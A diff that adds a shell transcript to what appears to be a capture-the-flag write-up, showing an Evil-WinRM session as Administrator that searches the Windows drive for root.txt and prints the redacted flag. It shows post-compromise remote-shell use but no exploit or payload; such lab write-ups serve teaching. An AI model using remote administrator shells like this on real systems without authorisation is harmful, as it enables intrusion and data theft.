@@ -1315,4 +1315,38 @@ checkpoint\administrator
 ```
 
 
+``` bash
+
+*Evil-WinRM* PS C:\Users\Administrator> Get-ChildItem C:\ -Recurse -Filter "root.txt" -ErrorAction SilentlyContinue
+
+
+
+    Directory: C:\Users\max.palmer\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         8/28/2026   7:11 PM             34 root.txt
+
+
+
+*Evil-WinRM* PS C:\Users\Administrator>
+*Evil-WinRM* PS C:\Users\Administrator> dir C:\Users\max.palmer\Desktop
+
+
+    Directory: C:\Users\max.palmer\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         8/28/2026   7:11 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator> type C:\Users\max.palmer\Desktop\root.txt
+eee6xxxxxxxxxxxxxxxxxxxxxxxxx
+*Evil-WinRM* PS C:\Users\Administrator>
+
+```
+
+
 
